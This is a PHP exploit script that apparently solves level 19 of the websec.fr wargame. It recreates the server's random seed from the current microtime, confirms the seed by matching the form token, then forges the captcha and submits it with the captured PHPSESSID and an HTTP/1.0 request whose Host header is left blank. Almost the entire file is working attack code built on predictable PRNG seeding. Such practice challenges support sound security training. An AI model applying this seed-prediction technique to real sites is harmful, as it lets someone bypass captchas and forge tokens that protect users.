<?php 
    echo "Starting script\n";

    srand (microtime (true));

    function generate_random_text ($length) {
        $chars  = "abcdefghijklmnopqrstuvwxyz";
        $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $chars .= "1234567890";

        $text = '';
        for($i = 0; $i < $length; $i++) {
            $text .= $chars[rand () % strlen ($chars)];
        }
        return $text;
    }
    $my_token = generate_random_text(32);
    echo "My token = " . $my_token . "\n";

    $resp = file_get_contents("https://websec.fr/level19/index.php");

    $php_sessid = null;
    foreach ($http_response_header as $hdr) {
        if (preg_match('/^Set-Cookie:\s*PHPSESSID=([^;]+)/', $hdr, $matches)) {
            $php_sessid = $matches[1];
            break;
        }
    }
    echo "sessid: " . $php_sessid , "\n";

    $server_token = preg_match('/name="token" value="([A-Z)a-z0-9]+)"/', $resp, $matches);

    if ($my_token === $matches[1]) {
        echo "Found seed!\n";
    }
    else {
        die("Seed is wrong");
    }

    $captcha = generate_random_text (255 / 10.0);

    echo "Captcha is: " . $captcha . "\n";

    $ch = curl_init('https://websec.fr/level19/index.php');
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURLOPT_HTTP_VERSION_1_0);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$php_sessid");
    curl_setopt($ch, CURLOPT_POSTFIELDS, "captcha=$captcha&token=$my_token");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: \r\n",  // Just spaces
    "Content-Type: application/x-www-form-urlencoded"
]);

    curl_exec($ch);
    curl_close($ch);
?>